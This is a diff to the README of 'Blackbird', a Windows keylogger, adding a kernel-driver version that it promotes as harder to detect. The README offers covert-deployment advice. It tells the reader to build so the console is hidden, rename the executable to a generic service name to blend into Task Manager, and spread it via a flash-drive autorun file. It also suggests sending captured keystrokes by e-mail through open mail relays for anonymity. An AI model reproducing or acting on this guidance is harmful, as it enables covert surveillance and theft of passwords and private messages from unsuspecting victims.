@@ -1,7 +1,24 @@
 # Blackbird
-A little bird that tells you. Capable Windows userspace keylogger in ~300 lines of modern C++.
+A little bird that tells you. Capable Windows keylogger available in both user-space and kernel-space versions.
 
-## Features
+## Versions
+
+Blackbird is available in two implementations:
+
+### User-Space Version (main.cpp)
+A capable Windows user-space keylogger in ~300 lines of modern C++.
+- Easy to build and deploy
+- Requires only standard Visual Studio tools
+- Runs as a regular Windows application
+
+### Kernel-Space Version (driver/)
+A Windows kernel driver that intercepts keyboard input at the kernel level.
+- Operates at kernel level for deeper system integration
+- Harder to detect than user-space applications
+- Requires Windows Driver Kit (WDK) to build
+- See [driver/README.md](driver/README.md) for details
+
+## Features (User-Space Version)
 - Logs to an offline file and/or an e-mail address.
 - Respects the user locale and outputs UTF-8, hence supports all keyboard layouts and languages.
 - Minimal memory consumption and performance impact.
@@ -10,10 +27,19 @@ A little bird that tells you. Capable Windows userspace keylogger in ~300 lines 
 - Capable of running automatically on system startup.
 
 ## Building
+
+### User-Space Version
 - Configure and generate with CMake.
 - Build the `blackbird` (or `ALL_BUILD`) target with Visual Studio.
 
-## Adjusting the settings
+### Kernel-Space Version
+See [driver/README.md](driver/README.md) for detailed build and installation instructions.
+The kernel driver requires:
+- Windows Driver Kit (WDK)
+- Visual Studio with driver development support
+- Administrator privileges for installation
+
+## Adjusting the settings (User-Space Version)
 You can adjust the settings in the main function:
 ```cpp
 std::int32_t WinMain(HINSTANCE, HINSTANCE, LPTSTR, std::int32_t)
@@ -68,7 +94,7 @@ In order to use the e-mail functionality, you need access to an SMTP service. [T
 ```
 Note that most of such services are traceable to your person. For anonymity you should look into [open mail relays](https://en.wikipedia.org/wiki/Open_mail_relay) such as John Gilmore's `new.toad.com`, or set up your own SMTP server.
 
-## Reminders for deploying
+## Reminders for deploying (User-Space Version)
 - Build in `Release` mode. This makes the console invisible, and is necessary for copying into system directory and running at startup functionalities to work.
 - Rename the executable to something generic such as `Service Wrapper.exe`. This is the name that will appear in the system directory and the Task Manager.
 - To deploy using a flash drive or similar media, you can create an `autorun.inf` file with the following content:
